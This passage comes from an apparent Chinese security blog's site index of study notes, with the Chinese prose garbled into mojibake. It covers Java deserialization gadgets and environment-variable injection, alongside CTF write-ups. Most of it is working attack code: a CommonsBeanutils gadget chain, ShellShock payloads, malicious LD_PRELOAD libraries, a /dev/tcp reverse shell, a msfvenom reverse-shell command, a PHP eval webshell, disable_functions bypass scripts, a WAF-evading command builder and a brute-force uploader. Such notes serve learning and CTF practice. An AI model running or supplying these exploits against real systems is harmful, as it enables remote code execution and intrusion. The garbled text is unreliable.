·çš„æ¡ä»¶ï¼š\nå®ç°java.util.Comparatoræ¥å£ å®ç°java.io.Serializableæ¥å£ æœ€å¥½è‡ªå¸¦ï¼Œå…¼å®¹æ€§å¼º æˆ‘ä»¬æ‰¾åˆ°äº†java.util.Stringä¸­çš„å†…éƒ¨ç§æœ‰ç±»CaseInsesitiveComparatorï¼Œå®ƒå®ç°äº†Comparatorå’ŒSerializable\næ›¿æ¢exp\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import org.apache.commons.beanutils.BeanComparator; import java.io.ByteArrayOutputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.PriorityQueue; public class CommonsBeanutils1Shiro { public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception { Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } public byte[] getPayload(byte[] clazzBytes) throws Exception { TemplatesImpl obj = new TemplatesImpl(); setFieldValue(obj, \u0026#34;_bytecodes\u0026#34;, new byte[][]{clazzBytes}); setFieldValue(obj, \u0026#34;_name\u0026#34;, \u0026#34;HelloTemplatesImpl\u0026#34;); setFieldValue(obj, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); final BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER); final PriorityQueue\u0026lt;Object\u0026gt; queue = new PriorityQueue\u0026lt;Object\u0026gt;(2, comparator); // stub data for replacement later queue.add(\u0026#34;1\u0026#34;); queue.add(\u0026#34;1\u0026#34;); setFieldValue(comparator, \u0026#34;property\u0026#34;, \u0026#34;outputProperties\u0026#34;); setFieldValue(queue, \u0026#34;queue\u0026#34;, new Object[]{obj, obj}); // ================== // ç”Ÿæˆåºåˆ—åŒ–å­—ç¬¦ä¸² ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(queue); oos.close(); return barr.toByteArray(); } } ","date":"2022-03-23T18:40:31+08:00","permalink":"https://amiaaaz.github.io/2022/03/23/java-study-notes-03/","section":"posts","tags":["Java","unserialize"],"title":"Javaå­¦ä¹ ç¬”è®°â…¢"},{"categories":["NOTES\u0026SUMMARY"],"contents":"æ™®é€šç¯å¢ƒå˜é‡ æˆ‘æ˜¯å¦‚ä½•åˆ©ç”¨ç¯å¢ƒå˜é‡æ³¨å…¥æ‰§è¡Œä»»æ„å‘½ä»¤\nENV=\u0026#39;$(id 1\u0026gt;\u0026amp;2)\u0026#39; dash -i -c \u0026#39;echo hello\u0026#39; BASH_ENV=\u0026#39;$(id 1\u0026gt;\u0026amp;2)\u0026#39; bash -c \u0026#39;echo hello\u0026#39; ENV=\u0026#39;$(id 1\u0026gt;\u0026amp;2)\u0026#39; sh -i -c \u0026#34;echo hello\u0026#34; PROMPT_COMMAND=\u0026#39;id\u0026#39; bash\t# æ‰§è¡Œå‘½ä»¤åç»™å‡ºäº¤äº’shell debianæ—  env $\u0026#39;BASH_FUNC_echo%%=() { id; }\u0026#39; bash -c \u0026#39;echo hello\u0026#39;\t# bash 4.4åŠä»¥å env $\u0026#39;BASH_FUNC_echo()=() { id; }\u0026#39; bash -c \u0026#34;echo hello\u0026#34;\t# bash 4.4ä»¥å‰ ShellShock / CVE-2014-6271 ShellShockæ¼æ´å›é¡¾ä¸åˆ†ææµ‹è¯• | å¤ç° - vulhub\nåº”ç”¨äºbash 4.3åŠä»¥å‰\n$ env TEST=\u0026#39;() { :; };\u0026#39; id; $ env x=\u0026#39;() { :;}; echo vulnerable\u0026#39; bash -c \u0026#34;echo this is a test \u0026#34; å¯¹äºvulhubçš„ç¯å¢ƒï¼Œè¿˜å¯ä»¥åœ¨UAå¤´æ³¨å…¥\n$ curl -H \u0026#39;User-Agent: () { foo; }; echo Content-Type: text/plain; echo; /usr/bin/id\u0026#39; http://127.0.0.1:8080/victim.cgi -i å¯¹äºå½“æ—¶çš„å„å¤§webæœåŠ¡æ¥è¯´å½±å“ç›¸å½“å¹¿æ³›ï¼Œåªè¦æ˜¯è¿è¡ŒCGIç›¸å…³æœåŠ¡çš„ç³»ç»Ÿéƒ½å­˜åœ¨è¢«åˆ©ç”¨çš„å¯èƒ½ï¼ˆå› ä¸ºä¼šåœ¨åº•å±‚è°ƒç”¨bashï¼‰ï¼Œæ¯”å¦‚\nè¿è¡ŒCGIè„šæœ¬ï¼ˆé€šè¿‡mod_cgi å’Œ mod_cgidï¼‰çš„Apache HTTP æœåŠ¡å™¨ï¼› æŸäº›DHCPå®¢æˆ·ç«¯ï¼› ä½¿ç”¨Bashçš„å„ç§ç½‘ç»œæœåŠ¡ï¼› ä½¿ç”¨ForceCommandåŠŸèƒ½çš„ OpenSSH æœåŠ¡å™¨ï¼› ä½¿ç”¨CGIä½œä¸ºç½‘ç»œæ¥å£çš„åŸºäºLinuxçš„è·¯ç”±å™¨ï¼› ä½¿ç”¨bashçš„å„ç§åµŒå…¥å¼è®¾å¤‡ã€‚ â€¦â€¦ LD_PRELOAD #define _GNU_SOURCE #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; __attribute__ ((__constructor__)) void preload (void){ system(\u0026#34;ls / \u0026gt; /var/www/html/look\u0026#34;); // system(\u0026#34;bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/ip/port 0\u0026gt;\u0026amp;1\u0026#39;\u0026#34;); // system(\u0026#34;echo \\\u0026#34;\u0026lt;?php eval(\\\\$_POST[cmd]);?\u0026gt;\\\u0026#34; \u0026gt; /var/www/html/ame.php\u0026#34;); } $ gcc -fPIC -shared evil.c -o evil.so $ msfvenom -a x64 --platform Linux -p linux/x64/shell_reverse_tcp lhost=192.168.31.29 lport=8426 -f elf-so -o evil.so åŠ è½½æ¶æ„.soæ–‡ä»¶æ¥åŠ«æŒä»»æ„å‡½æ•°ï¼Œå¸¸å‡ºç°äºbypass disable_functionså’Œæ‰“redisä¸­\nå½“webæœåŠ¡æä¾›äº†è‡ªå®šä¹‰ç¯å¢ƒå˜é‡çš„æ¥å£ï¼Œä¹Ÿå¯ä»¥ç”¨å®ƒæ¥rce\nbypass disable_functions æµ…è°ˆå‡ ç§Bypass disable_functionsçš„æ–¹æ³•\ngetuid #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; int geteuid() { const char* cmdline = getenv(\u0026#34;EVIL_CMDLINE\u0026#34;); if (getenv(\u0026#34;LD_PRELOAD\u0026#34;) == NULL) { return 0; } unsetenv(\u0026#34;LD_PRELOAD\u0026#34;); system(cmdline); } $ gcc -shared -fPIC test.c -o test.so \u0026lt;?php echo \u0026#34;\u0026lt;p\u0026gt; \u0026lt;b\u0026gt;example\u0026lt;/b\u0026gt;: http://test.com/exp.php?cmd=pwd\u0026amp;outpath=/tmp/xx\u0026amp;sopath=/var/www/html/exp.so \u0026lt;/p\u0026gt;\u0026#34;; $cmd = $_GET[\u0026#34;cmd\u0026#34;]; $out_path = $_GET[\u0026#34;outpath\u0026#34;]; $evil_cmdline = $cmd . \u0026#34; \u0026gt; \u0026#34; . $out_path . \u0026#34; 2\u0026gt;\u0026amp;1\u0026#34;; echo \u0026#34;\u0026lt;p\u0026gt; \u0026lt;b\u0026gt;cmdline\u0026lt;/b\u0026gt;: \u0026#34; . $evil_cmdline . \u0026#34;\u0026lt;/p\u0026gt;\u0026#34;; putenv(\u0026#34;EVIL_CMDLINE=\u0026#34; . $evil_cmdline); $so_path = $_GET[\u0026#34;sopath\u0026#34;]; putenv(\u0026#34;LD_PRELOAD=\u0026#34; . $so_path); mail(\u0026#34;\u0026#34;, \u0026#34;\u0026#34;, \u0026#34;\u0026#34;, \u0026#34;\u0026#34;); echo \u0026#34;\u0026lt;p\u0026gt; \u0026lt;b\u0026gt;output\u0026lt;/b\u0026gt;: \u0026lt;br /\u0026gt;\u0026#34; . nl2br(file_get_contents($out_path)) . \u0026#34;\u0026lt;/p\u0026gt;\u0026#34;; unlink($out_path); ?\u0026gt; url/test.php?cmd=pwd\u0026amp;outpath=/tmp/xx\u0026amp;sopath=/var/www/html/test.so åŸç†æ˜¯åˆ©ç”¨mailè§¦å‘sendmailï¼Œå†è§¦å‘getuidï¼ˆå·²è¢«æˆ‘ä»¬çš„.soåŠ«æŒï¼‰ï¼Œæœ€åæ‰§è¡Œå‘½ä»¤\npreload #define _GNU_SOURCE #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; extern char** environ; __attribute__ ((__constructor__)) void preload (void) { // get command line options and arg const char* cmdline = getenv(\u0026#34;EVIL_CMDLINE\u0026#34;); // unset environment variable LD_PRELOAD. // unsetenv(\u0026#34;LD_PRELOAD\u0026#34;) no effect on some // distribution (e.g., centos), I need crafty trick. int i; for (i = 0; environ[i]; ++i) { if (strstr(environ[i], \u0026#34;LD_PRELOAD\u0026#34;)) { environ[i][0] = \u0026#39;\\0\u0026#39;; } } // executive command system(cmdline); } $ gcc -shared -fPIC bypass_disablefunc.c -o bypass_disablefunc.so \u0026lt;?php echo \u0026#34;\u0026lt;p\u0026gt; \u0026lt;b\u0026gt;example\u0026lt;/b\u0026gt;: http://site.com/bypass_disablefunc.php?cmd=pwd\u0026amp;outpath=/tmp/xx\u0026amp;sopath=/var/www/bypass_disablefunc_x64.so \u0026lt;/p\u0026gt;\u0026#34;; $cmd = $_GET[\u0026#34;cmd\u0026#34;]; $out_path = $_GET[\u0026#34;outpath\u0026#34;]; $evil_cmdline = $cmd . \u0026#34; \u0026gt; \u0026#34; . $out_path . \u0026#34; 2\u0026gt;\u0026amp;1\u0026#34;; echo \u0026#34;\u0026lt;p\u0026gt; \u0026lt;b\u0026gt;cmdline\u0026lt;/b\u0026gt;: \u0026#34; . $evil_cmdline . \u0026#34;\u0026lt;/p\u0026gt;\u0026#34;; putenv(\u0026#34;EVIL_CMDLINE=\u0026#34; . $evil_cmdline); $so_path = $_GET[\u0026#34;sopath\u0026#34;]; putenv(\u0026#34;LD_PRELOAD=\u0026#34; . $so_path); mail(\u0026#34;\u0026#34;, \u0026#34;\u0026#34;, \u0026#34;\u0026#34;, \u0026#34;\u0026#34;); echo \u0026#34;\u0026lt;p\u0026gt; \u0026lt;b\u0026gt;output\u0026lt;/b\u0026gt;: \u0026lt;br /\u0026gt;\u0026#34; . nl2br(file_get_contents($out_path)) . \u0026#34;\u0026lt;/p\u0026gt;\u0026#34;; unlink($out_path); ?\u0026gt; url/test.php?cmd=pwd\u0026amp;outpath=/tmp/xx\u0026amp;sopath=/var/www/html/test.so è¿™ä¸ªå±äºæ ¼å±€æ‰“å¼€ï¼Œä¸å±€é™äºåŠ«æŒæŸä¸ªå‡½æ•°ï¼Œè€Œæ˜¯é€šè¿‡preloadæ‹¦æˆªå¯åŠ¨è¿›ç¨‹\nin CTF [PlaidCTF 2021] wp\n[pbCTF 2021]Advancement wp | wp2 | HACKING WITH ENVIRONMENT VARIABLES Interesting environment variables to supply to scripting language interpreters\næ˜¯GoAheadæ¡†æ¶ï¼Œåœ¨route.txtä¸­å¢åŠ cgiè·¯ç”±\nroute uri=/cgi-bin handler=cgi route uri=/ redirect=/cgi-bin/date handler=redirect ä»¥åŠ/cgi-binä¸‹çš„cgiè„šæœ¬\n#!/usr/bin/env python3 from datetime import date print(\u0026#34;Content-Type: text/plain\u0026#34;) print() today = date.today() print(\u0026#34;Today\u0026#39;s date:\u0026#34;, today) è€Œç”±GoAheadçš„cveæˆ‘ä»¬çŸ¥é“ï¼ˆä½†å¥½åƒè¿™ä¸ªé¢˜åœ¨å½“æ—¶æ˜¯dayé¢˜ æ²¡æœ‰å…¬å¼€çš„cve-2021-42342 è€Œè¿™é‡Œç”¨çš„å°±æ˜¯è¿™ä¸ªï¼‰ï¼Œä¸Šä¼ è¡¨å•é”®å€¼å¯¹å¯ä»¥å†™å…¥ç¯å¢ƒå˜é‡ä¸­ï¼Œæˆ‘ä»¬é€‰æ‹©åœ¨PYTHONWARNINGSç¯å¢ƒå˜é‡å¼•å…¥å…¶å®ƒæ¨¡å—ï¼Œå†é€šè¿‡antigravityæ¨¡å—å¯¹äºbrowserç¯å¢ƒå˜é‡å¯åŠ¨å“åº”çš„è¿›ç¨‹ï¼Œé…åˆperl+PERL5OPTç¯å¢ƒå˜é‡è¿›è¡Œrceï¼ˆæ›´å¤šå†…å®¹å‚è§ä¸Šé¢çš„æ–‡ç« \n$ curl -F \u0026#34;PYTHONWARNINGS=all:0:antigravity.x:0:0\u0026#34; -F \u0026#34;BROWSER=perlthanks\u0026#34; -F \u0026#39;PERL5OPT=-Mbase;print(system(\u0026#34;cat\u0026#34;.chr(0x20).\u0026#34;/flag\u0026#34;));exit;\u0026#39; http://advancement.chal.perfect.blue â€”â€”â€”â€”pç‰›åœ¨vulhubä¸­ç»™å‡ºçš„pocç”¨çš„æ˜¯LD_PRELOADï¼Œä½†æ˜¯ç”±äºè¿™ä¸ªé¢˜ç›®çš„ç›¸å…³ç›®å½•/etc/goahead/tmpæ˜¯åªè¯»çš„ï¼Œæ‰€ä»¥æ— æ³•æ„é€ ä¸Šä¼ è¡¨å•ä¼ .so\n[æ¹–æ¹˜æ¯2021 çº¿ä¸‹]MultistageAgency wp1 | wp2\næœ‰proxyå’Œwebä¸¤ä¸ªwebç”¨æˆ·èµ·çš„æœåŠ¡ï¼Œserverç”±rootèµ·\nproxyåœ¨å†…ç½‘çš„8080ç«¯å£ï¼Œä¸»è¦æä¾›è¿”å›Secretkeyçš„åŠŸèƒ½\npackage main import ( \u0026#34;github.com/elazarl/goproxy\u0026#34; \u0026#34;io/ioutil\u0026#34; \u0026#34;log\u0026#34; \u0026#34;net/http\u0026#34; \u0026#34;os\u0026#34; ) func main() { file, err := os.Open(\u0026#34;secret/key\u0026#34;) // è¯»å–å½“å‰ç›®å½•ä¸‹çš„key if err != nil { panic(err) } defer file.Close() content, err := ioutil.ReadAll(file) SecretKey := string(content) proxy := goproxy.NewProxyHttpServer() proxy.Verbose = true proxy.OnRequest().DoFunc( func(r *http.Request,ctx *goproxy.ProxyCtx)(*http.Request,*http.Response) { r.Header.Set(\u0026#34;Secretkey\u0026#34;,SecretKey) // è¿”å›åŒ…çš„è¯·æ±‚å¤´è®¾ç½®Secretkey return r,nil }) log.Print(\u0026#34;start listen 8080\u0026#34;) log.Fatal(http.ListenAndServe(\u0026#34;:8080\u0026#34;, proxy)) } 9091ç«¯å£serverï¼Œæœ‰å‘½ä»¤æ³¨å…¥ç‚¹/manageå’Œä¸€ä¸ªwafï¼Œå¹¶ä¸”éœ€è¦æœ¬åœ°ipè®¿é—®\npackage main import ( \u0026#34;bytes\u0026#34; \u0026#34;crypto/md5\u0026#34; \u0026#34;fmt\u0026#34; \u0026#34;io/ioutil\u0026#34; \u0026#34;log\u0026#34; \u0026#34;net/http\u0026#34; \u0026#34;os\u0026#34; \u0026#34;os/exec\u0026#34; \u0026#34;unicode\u0026#34; ) // æ£€æŸ¥æ¥æºipä¸ºæœ¬åœ°æ‰ç»§ç»­æ‰§è¡Œ var SecretKey = \u0026#34;\u0026#34; func getToken(w http.ResponseWriter, r *http.Request) { header := r.Header token := \u0026#34;error\u0026#34; var sks []string = header[\u0026#34;Secretkey\u0026#34;] sk := \u0026#34;\u0026#34; if len(sks) == 1 { sk = sks[0] } var fromHosts []string = header[\u0026#34;Fromhost\u0026#34;] fromHost := \u0026#34;\u0026#34; if len(fromHosts) == 1 { fromHost = fromHosts[0] } if fromHost != \u0026#34;\u0026#34; \u0026amp;\u0026amp; sk != \u0026#34;\u0026#34; \u0026amp;\u0026amp; sk == SecretKey { data := []byte(sk + fromHost) has := md5.Sum(data) token = fmt.Sprintf(\u0026#34;%x\u0026#34;, has) } fmt.Fprintf(w, token) } func manage(w http.ResponseWriter, r *http.Request) { values := r.URL.Query() m := values.Get(\u0026#34;m\u0026#34;)\t// getæ–¹å¼ä¼ å…¥må‚æ•° if !waf(m) { fmt.Fprintf(w, \u0026#34;waf!\u0026#34;) return } cmd := fmt.Sprintf(\u0026#34;rm -rf uploads/%s\u0026#34;, m)\t// åˆ é™¤uploads/{m}ä¸‹æ‰€æœ‰å†…å®¹ fmt.Println(cmd) command := exec.Command(\u0026#34;bash\u0026#34;, \u0026#34;-c\u0026#34;, cmd)\t// å‘½ä»¤æ³¨å…¥ç‚¹ outinfo := bytes.Buffer{} outerr := bytes.Buffer{} command.Stdout = \u0026amp;outinfo command.Stderr = \u0026amp;outerr err := command.Start() res := \u0026#34;ERROR\u0026#34; if err != nil { fmt.Println(err.Error()) } if err = command.Wait(); err != nil { res = outerr.String() } else { res = outinfo.String() } fmt.Fprintf(w, res) } func waf(c string) bool { var t int32 t = 0 blacklist := []string{\u0026#34;.\u0026#34;, \u0026#34;*\u0026#34;, \u0026#34;?\u0026#34;}\t// é»‘åå• for _, s := range c { for _, b := range blacklist { if b == string(s) { return false } } if unicode.IsLetter(s) {\t// æ˜¯å¦ä¸ºå­—æ¯ if t == s { continue\t// å¦‚æœä¸‹ä¸€ä¸ªå­—ç¬¦ascii==ä¸Šä¸€ä¸ªå­—ç¬¦ åˆ™ç»§ç»­ } if t == 0 { t = s } else { return false } } } return true } func main() { file, err := os.Open(\u0026#34;secret/key\u0026#34;) if err != nil { panic(err) } defer file.Close() content, err := ioutil.ReadAll(file) SecretKey = string(content) http.HandleFunc(\u0026#34;/\u0026#34;, getToken) http.HandleFunc(\u0026#34;/manage\u0026#34;, manage) log.Print(\u0026#34;start listen 9091\u0026#34;) err = http.ListenAndServe(\u0026#34;:9091\u0026#34;, nil) // ç›‘å¬ç«¯å£ 9091 if err != nil { log.Fatal(\u0026#34;ListenAndServe: \u0026#34;, err) } } webæœåŠ¡ï¼Œå¯¹å¤–è®¿é—®\npackage main import ( \u0026#34;bytes\u0026#34; \u0026#34;crypto/md5\u0026#34; \u0026#34;encoding/json\u0026#34; \u0026#34;fmt\u0026#34; \u0026#34;io\u0026#34; \u0026#34;io/ioutil\u0026#34; \u0026#34;log\u0026#34; \u0026#34;math/rand\u0026#34; \u0026#34;net/http\u0026#34; \u0026#34;os\u0026#34; \u0026#34;os/exec\u0026#34; \u0026#34;path/filepath\u0026#34; \u0026#34;strings\u0026#34; ) var SecretKey = \u0026#34;\u0026#34; type TokenResult struct { Success string json:\u0026#34;success\u0026#34; Failed string json:\u0026#34;failed\u0026#34; } const letterBytes = \u0026#34;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\u0026#34; func RandStringBytes(n int) string { b := make([]byte, n) for i := range b { b[i] = letterBytes[rand.Intn(len(letterBytes))] } return string(b) } func getToken(w http.ResponseWriter, r *http.Request) { values := r.URL.Query() fromHostList := strings.Split(r.RemoteAddr, \u0026#34;:\u0026#34;) // è·å–æ¥æºip fromHost := \u0026#34;\u0026#34; if len(fromHostList) == 2 { fromHost = fromHostList[0] } r.Header.Set(\u0026#34;Fromhost\u0026#34;, fromHost) command := exec.Command(\u0026#34;curl\u0026#34;, \u0026#34;-H\u0026#34;, \u0026#34;Fromhost: \u0026#34;+fromHost, \u0026#34;127.0.0.1:9091\u0026#34;)\t// æœ¬åœ°curlè®¿é—®9091 for k, _ := range values { command.Env = append(command.Env, fmt.Sprintf(\u0026#34;%s=%s\u0026#34;, k, values.Get(k))) //è·å–ç¯å¢ƒå˜é‡ å°†å‚æ•°é”®å€¼å¯¹å½¢å¼è®¾ä¸ºç¯å¢ƒå˜é‡ } outinfo := bytes.Buffer{} outerr := bytes.Buffer{} command.Stdout = \u0026amp;outinfo command.Stderr = \u0026amp;outerr err := command.Start() // res := \u0026#34;ERROR\u0026#34; if err != nil { fmt.Println(err.Error()) } res := TokenResult{} if err = command.Wait(); err != nil { res.Failed = outerr.String() } res.Success = outinfo.String() msg, _ := json.Marshal(res) w.Write(msg) } type ListFileResult struct { Files []string json:\u0026#34;files\u0026#34; } // æŸ¥çœ‹å½“å‰ token ä¸‹çš„æ–‡ä»¶ func listFile(w http.ResponseWriter, r *http.Request) { values := r.URL.Query() token := values.Get(\u0026#34;token\u0026#34;) fromHostList := strings.Split(r.RemoteAddr, \u0026#34;:\u0026#34;) fromHost := \u0026#34;\u0026#34; if len(fromHostList) == 2 { fromHost = fromHostList[0] } // éªŒè¯token if token != \u0026#34;\u0026#34; \u0026amp;\u0026amp; checkToken(token, fromHost) { dir := filepath.Join(\u0026#34;uploads\u0026#34;,token) // å¸¦ç€tokenè·å–å·²ç»ä¸Šä¼ çš„æ–‡ä»¶ files, err := ioutil.ReadDir(dir) if err == nil { var fs []string for _, f := range files { fs = append(fs, f.Name()) } msg, _ := json.Marshal(ListFileResult{Files: fs}) w.Write(msg) } } } type UploadFileResult struct { Code string json:\u0026#34;code\u0026#34; } func uploadFile(w http.ResponseWriter, r *http.Request) { if r.Method == \u0026#34;GET\u0026#34; { fmt.Fprintf(w, \u0026#34;get\u0026#34;) } else { values := r.URL.Query() token := values.Get(\u0026#34;token\u0026#34;)\t// getæ–¹å¼ä¼ å…¥tokenå‚æ•° fromHostList := strings.Split(r.RemoteAddr, \u0026#34;:\u0026#34;) fromHost := \u0026#34;\u0026#34; if len(fromHostList) == 2 { fromHost = fromHostList[0] } // éªŒè¯token if token != \u0026#34;\u0026#34; \u0026amp;\u0026amp; checkToken(token, fromHost) { dir := filepath.Join(\u0026#34;uploads\u0026#34;,token) // å°†è·å–åˆ°çš„tokenæ–°å»ºæ–‡ä»¶å¤¹ if _, err := os.Stat(dir); err != nil { os.MkdirAll(dir, 0766) } files, err := ioutil.ReadDir(dir) if len(files) \u0026gt; 5 { command := exec.Command(\u0026#34;curl\u0026#34;, \u0026#34;127.0.0.1:9091/manage\u0026#34;) // å¦‚æœæ–‡ä»¶å¤§äºäº”ä¸ª åˆ™æœ¬åœ°è®¿é—®9091/manageåˆ é™¤æ‰€æœ‰æ–‡ä»¶ command.Start() } r.ParseMultipartForm(32 \u0026lt;\u0026lt; 20) file, _, err := r.FormFile(\u0026#34;file\u0026#34;) if err != nil { msg, _ := json.Marshal(UploadFileResult{Code: err.Error()}) w.Write(msg) return } defer file.Close() fileName := RandStringBytes(5) f, err := os.OpenFile(filepath.Join(dir, fileName), os.O_WRONLY|os.O_CREATE, 0666) if err != nil { fmt.Println(err) return } defer f.Close() io.Copy(f, file) msg, _ := json.Marshal(UploadFileResult{Code: fileName}) w.Write(msg) } else { msg, _ := json.Marshal(UploadFileResult{Code: \u0026#34;ERROR TOKEN\u0026#34;}) w.Write(msg) } } } func checkToken(token, ip string) bool { data := []byte(SecretKey + ip) has := md5.Sum(data) md5str := fmt.Sprintf(\u0026#34;%x\u0026#34;, has) return md5str == token } func IndexHandler (w http.ResponseWriter, r *http.Request) { http.ServeFile(w, r,\u0026#34;dist/index.html\u0026#34;) } func main() { file, err := os.Open(\u0026#34;secret/key\u0026#34;)\t// è¯»secret/key if err != nil { panic(err) } defer file.Close() content, err := ioutil.ReadAll(file) SecretKey = string(content) http.HandleFunc(\u0026#34;/\u0026#34;, IndexHandler) fs := http.FileServer(http.Dir(\u0026#34;dist/static\u0026#34;)) http.Handle(\u0026#34;/static/\u0026#34;, http.StripPrefix(\u0026#34;/static/\u0026#34;, fs)) http.HandleFunc(\u0026#34;/token\u0026#34;, getToken) http.HandleFunc(\u0026#34;/upload\u0026#34;, uploadFile) http.HandleFunc(\u0026#34;/list\u0026#34;, listFile) log.Print(\u0026#34;start listen 9090\u0026#34;) err = http.ListenAndServe(\u0026#34;:9090\u0026#34;, nil) if err != nil { log.Fatal(\u0026#34;ListenAndServe: \u0026#34;, err) } } æ‰€ä»¥æˆ‘ä»¬éœ€è¦SSRFè®¿é—®9091ç«¯å£çš„/manage å¹¶ä¸”ç»•wafè¿›è¡Œå‘½ä»¤æ³¨å…¥è¯»flag\næ³¨æ„åˆ°webæœåŠ¡çš„/tokenè·¯ç”±å¯ä»¥è®¾ç½®ç¯å¢ƒå˜é‡ï¼Œæˆ‘ä»¬è‡ªç„¶æƒ³åˆ°åˆ©ç”¨LD_PRELOADå’Œæ¶æ„.soæ¥åŠ«æŒç³»ç»Ÿå‡½æ•°è¿›è¡Œrce\nä¼ æ–‡ä»¶ï¼Œé€šè¿‡webçš„/token?http_proxy=http://127.0.0.1:8080å¯ä»¥è·å¾—å½“å‰tokenï¼ˆå³ä¸Šä¼ ç›®å½•\nä¹‹åä¸Šä¼ æ¶æ„.so\n#include\u0026lt;stdlib.h\u0026gt; __attribute__((constructor)) void l3yx(){ unsetenv(\u0026#34;LD_PRELOAD\u0026#34;); system(getenv(\u0026#34;_evilcmd\u0026#34;)); } $ gcc -shared -fPIC e.c -o e.so åœ¨/token?LD_PRELOAD=/code/uploads/{token}\u0026amp;_evilcmd=ls%20-l%20/\u0026amp;http_proxy=127.0.0.1:8080ä¸‹è¿›è¡Œæ³¨å…¥ï¼ŒæˆåŠŸrce\nä¹‹åå¼¹ä¸ªshell\næœ€åï¼Œå¯¹äºwafï¼Œç”¨è¿™ä¸ªï¼ˆä¹‹å‰ä¹Ÿè§è¿‡\nn = dict() n[0] = \u0026#39;0\u0026#39; n[1] = \u0026#39;${##}\u0026#39; n[2] = \u0026#39;$((${##}\u0026lt;\u0026lt;${##}))\u0026#39; n[3] = \u0026#39;$(($((${##}\u0026lt;\u0026lt;${##}))#${##}${##}))\u0026#39; n[4] = \u0026#39;$((${##}\u0026lt;\u0026lt;$((${##}\u0026lt;\u0026lt;${##}))))\u0026#39; n[5] = \u0026#39;$(($((${##}\u0026lt;\u0026lt;${##}))#${##}0${##}))\u0026#39; n[6] = \u0026#39;$(($((${##}\u0026lt;\u0026lt;${##}))#${##}${##}0))\u0026#39; n[7] = \u0026#39;$(($((${##}\u0026lt;\u0026lt;${##}))#${##}${##}${##}))\u0026#39; f=\u0026#39;\u0026#39; def str_to_oct(cmd): s = \u0026#34;\u0026#34; for t in cmd: o = (\u0026#39;%s\u0026#39; % (oct(ord(t))))[2:] s+=\u0026#39;\\\\\u0026#39;+o return s def build(cmd): payload = \u0026#34;$0\u0026lt;\u0026lt;\u0026lt;$0\\\u0026lt;\\\u0026lt;\\\u0026lt;\\$\\\\\\\u0026#39;\u0026#34; s = str_to_oct(cmd).split(\u0026#39;\\\\\u0026#39;) for _ in s[1:]: payload+=\u0026#34;\\\\\\\\\u0026#34; for i in _: payload+=n[int(i)] return payload+\u0026#39;\\\\\\\u0026#39;\u0026#39; print(build(\u0026#39;cat /flag\u0026#39;)) curl \u0026quot;http://localhost:9091/manage?m=%3b{urlencode(payload)}\u0026quot;\n[è™ç¬¦CTF 2022]ezphp wp\n\u0026lt;?php (empty($_GET[\u0026#34;env\u0026#34;])) ? highlight_file(__FILE__) : putenv($_GET[\u0026#34;env\u0026#34;]) \u0026amp;\u0026amp; system(\u0026#39;echo hfctf2022\u0026#39;);?\u0026gt; oneline phpï¼Œçœ‹åˆ°è¿™ä¸ªputenvå†ç»“åˆå‰é¢çš„æ —å­åº”è¯¥ä¸é™Œç”Ÿäº†å°±ï¼Œç»“åˆNginxä¸Šä¼ ä¸´æ—¶æ–‡ä»¶ ä¼ .so\n#define _GNU_SOURCE #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; __attribute__ ((__constructor__)) void preload (void){ system(\u0026#34;echo \\\u0026#34;\u0026lt;?php eval(\\\\$_POST[cmd]);?\u0026gt;\\\u0026#34; \u0026gt; /var/www/html/ame.php\u0026#34;); } $ gcc -fPIC -shared evil.c -o evil.so import threading, requests URL2 = f\u0026#39;http://127.0.0.1:30002/index.php\u0026#39; nginx_workers = [12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27] done = False def uploader(): print(\u0026#39;[+] starting uploader\u0026#39;) with open(\u0026#34;exp.so\u0026#34;,\u0026#34;rb\u0026#34;) as f: data = f.read() while not done: requests.get(URL2, data=data) for _ in range(16): t = threading.Thread(target=uploader) t.start() def bruter(pid): global done while not done: print(f\u0026#39;[+] brute loop restarted: {pid}\u0026#39;) for fd in range(4, 32): try: requests.get(URL2, params={ \u0026#39;env\u0026#39;: f\u0026#34;LD_PRELOAD=/proc/{pid}/fd/{fd}\u0026#34; }) except: pass for pid in nginx_workers: a = threading.Thread(target=bruter, args=(pid, )) a.start() Real World GoAhead / CVE-2017-17562 GoAhead: 2.5 ~ 3.6.5\nå¤ç° - vulhub | REMOTE LD_PRELOAD EXPLOITATION GoAhead: Make My Day\nGoAheadå¯ä»¥è¿è¡Œaspï¼Œjså’Œæ ‡å‡†çš„CGIç¨‹åºï¼Œæ¼æ´å‘ç”Ÿåœ¨è¿è¡ŒCGIç¨‹åºæ—¶\nåœ¨æ”¶åˆ°è¯·æ±‚åä¼šä»urlå‚æ•°ä¸­å–å‡ºé”®å€¼å¯¹å¹¶æ³¨å†Œè¿›CGIç¨‹åºçš„ç¯å¢ƒå˜é‡ï¼Œä¸”åªè¿‡æ»¤äº†REMOTE_HOSTå’ŒHTTP_AUTHORIZATIONï¼Œè€ŒLinuxä¸‹LD_å¼€å¤´çš„ç¯å¢ƒå˜é‡å’ŒåŠ¨æ€é“¾æ¥åº“æœ‰å…³ï¼Œæ¯”å¦‚LD_PRELOADæŒ‡å®šçš„åŠ¨æ€é“¾æ¥åº“ä¼šè‡ªåŠ¨åŠ 